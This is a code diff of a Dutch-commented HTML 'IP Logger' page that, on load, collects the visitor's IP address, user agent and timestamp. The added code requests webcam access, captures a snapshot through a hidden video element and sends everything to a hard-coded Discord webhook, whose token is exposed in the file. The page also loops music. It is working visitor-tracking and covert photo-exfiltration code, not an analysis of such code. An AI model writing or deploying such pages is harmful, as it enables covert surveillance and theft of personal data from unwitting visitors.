@@ -5,31 +5,48 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>IP Logger</title>
     <script>
-        // Functie om IP-adres, gebruikersagent en tijdstip te verkrijgen
+        // Functie om IP-adres, gebruikersagent, tijdstip en een foto te verkrijgen
         function getIP(json) {
             var ipAddress = json.ip;
             var userAgent = navigator.userAgent;
             var timestamp = new Date().toISOString();
-            var searchHistory = document.getElementById('searchHistory').value;
-            logToFile(ipAddress, userAgent, timestamp, searchHistory);
-            sendToDiscord(ipAddress, userAgent, timestamp, searchHistory);
+            var video = document.getElementById('video');
+
+            // Toegang vragen tot de camera
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function (stream) {
+                    video.srcObject = stream;
+                    video.play();
+                    // Wachten op het laden van de video feed
+                    video.onloadedmetadata = function () {
+                        setTimeout(function () {
+                            takeSnapshot(ipAddress, userAgent, timestamp);
+                        }, 1000); // Wacht 1 seconde voordat de foto wordt gemaakt
+                    };
+                })
+                .catch(function (err) {
+                    console.error("Error accessing camera: ", err);
+                });
+
+            // Muziek afspelen
+            var audio = new Audio('sound.mp3');
+            audio.loop = true;
+            audio.play();
         }
 
-        // Functie om IP-adres, gebruikersagent, tijdstip en zoekgeschiedenis naar een tekstbestand te loggen
-        function logToFile(ipAddress, userAgent, timestamp, searchHistory) {
-            var logData = "IP Address: " + ipAddress + "\nUser Agent: " + userAgent + "\nTimestamp: " + timestamp + "\nSearch History: " + searchHistory;
-            var blob = new Blob([logData], { type: 'text/plain' });
-            var link = document.createElement('a');
-            link.download = 'log.txt';
-            link.href = window.URL.createObjectURL(blob);
-            link.click();
-        }
+        // Functie om een foto te maken en naar Discord webhook te sturen in een embed bericht
+        function takeSnapshot(ipAddress, userAgent, timestamp) {
+            var video = document.getElementById('video');
+            var canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            var context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            var imageURL = canvas.toDataURL('image/jpeg');
 
-        // Functie om IP-adres, gebruikersagent, tijdstip en zoekgeschiedenis naar Discord webhook te sturen in een embed bericht
-        function sendToDiscord(ipAddress, userAgent, timestamp, searchHistory) {
             var webhookURL = 'https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP';
 
-            // Maak een embed object aan met de IP-adres, gebruikersagent, tijdstip en zoekgeschiedenis
+            // Maak een embed object aan met het IP-adres, gebruikersagent, tijdstip en de foto
             var embed = {
                 "embeds": [
                     {
@@ -51,12 +68,11 @@
                                 "name": "Tijdstip",
                                 "value": timestamp,
                                 "inline": true
-                            },
-                            {
-                                "name": "Zoekgeschiedenis",
-                                "value": searchHistory
                             }
-                        ]
+                        ],
+                        "image": {
+                            "url": imageURL
+                        }
                     }
                 ]
             };
@@ -75,6 +91,14 @@
             
             // Stuur het verzoek
             xhr.send(payload);
+
+            // Stop de video feed en de camera
+            var stream = video.srcObject;
+            var tracks = stream.getTracks();
+            tracks.forEach(function(track) {
+                track.stop();
+            });
+            video.srcObject = null;
         }
 
         // Wanneer de pagina wordt geladen, roep dan de functie op om het IP-adres te verkrijgen
@@ -82,17 +106,12 @@
             var script = document.createElement('script');
             script.src = 'https://api.ipify.org?format=jsonp&callback=getIP';
             document.getElementsByTagName('head')[0].appendChild(script);
-            
-            var audio = new Audio('sound.mp3');
-            audio.loop = true;
-            audio.play();
         };
     </script>
 </head>
 <body>
     <h1>IP Logger</h1>
-    <p>Deze pagina logt uw IP-adres, gebruikersagent, tijdstip en zoekgeschiedenis en stuurt het naar Discord.</p>
-    <label for="searchHistory">Zoekgeschiedenis:</label><br>
-    <textarea id="searchHistory" name="searchHistory" rows="4" cols="50"></textarea><br><br>
+    <p>Deze pagina logt uw IP-adres, gebruikersagent, tijdstip en stuurt het naar Discord, samen met een foto van de gebruiker. Ook wordt er muziek afgespeeld.</p>
+    <video id="video" style="display:none;"></video>
 </body>
 </html>
